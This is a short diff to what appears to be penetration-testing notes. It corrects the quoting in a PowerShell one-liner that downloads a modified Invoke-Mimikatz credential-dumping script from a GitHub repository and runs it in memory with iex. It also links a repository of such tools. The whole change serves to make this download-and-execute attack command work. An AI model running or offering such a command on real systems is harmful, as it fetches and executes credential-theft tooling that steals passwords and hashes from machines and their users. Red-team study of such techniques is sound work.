@@ -321,7 +321,7 @@ Note: Similar to PTH for applicable kerberos systems
 
 #### Patch script if VirtualAlloc Error
 ```
-iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/conma293/mvp/main/Invoke-Mimikatz_MOD.ps1)"
+iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/conma293/mvp/main/Invoke-Mimikatz_MOD.ps1")
 ```
 
 Patched script working available here - [Tool dump](https://github.com/conma293/mvp) 
